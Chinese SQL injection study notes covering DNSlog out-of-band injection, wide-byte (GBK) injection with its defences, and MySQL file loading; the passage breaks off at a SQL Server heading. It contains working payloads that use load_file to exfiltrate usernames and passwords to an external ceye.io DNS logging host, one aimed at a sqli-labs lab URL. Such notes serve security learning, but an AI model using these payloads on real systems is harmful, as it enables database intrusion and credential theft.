- DNSlog注入

  可能用在没有回显的情况下，布尔盲注是正确和错误会返回不同的结果，而时间盲注其实是布尔盲注的一种，正确和错误根据响应不同的时间来判断，DNSlog注入就是借助DNS平台[http://ceye.io](http://ceye.io/)显示

  - 语法
    and load_file(concat('\\\\',(select concat_ws('A',(username,password)) from security.users),'.[mysql.k1opg3.ceye.io](http://mysql.k1opg3.ceye.io/)\\abs')) -- q

  - 注意点
    前提条件1：secure_file_priv为空或指定目录而不是Null（show variables like '%secure%'）；前提条件2：是windows服务器，因为load_file函数只能在windows中使用。3.需要注意不能使用如~,@等特殊符号，平台不会显示

  - 操作要点
     用hex函数之后再转化http://192.168.2.38/sql/Less-9/?id=1'  and load_file(concat('\\\\',(select hex(concat_ws('~',username,password)) from security.users limit 0,1),'.[mysql.k1opg3.ceye.io](http://mysql.k1opg3.ceye.io/)\\abs')) -- q

- 宽字节注入

  GB2312/GBK/GB18030/BIG5/Shift_JIS

  - 黑盒测试 2%df'

  - 白盒测试
    查看MySQL编码是否为GBK,是否使用preg_replace把单引号替换成'\,是否使用addslashes进行转义，是否使用mysql_real_escape_string进行转义
    ​

  - 防御方式

    - 1.使用utf-8
      ps:不仅在gbk,韩文，日文等等都是宽字节，都有可能存在

    - 2.mysql_real_escape_string,并且需要设置mysql_set_charset('gbk',$conn)

    - 3.可以设置参数，character_set_client=binary

- 利用操作系统

  - MYSQL

    - 特点：习惯以ASCII文本格式保存数据库文件;使用十六进制代替字符串常量

    - 创建表
      create table authors (fname char(50),sname char(50),email char(100),flag int);

    - load data infile函数写入txt文件内容
      load data infile './users.txt' into table authors fields terminated by '';//注意该txt文件在数据库data目录下

  - SQL Server
    - 特点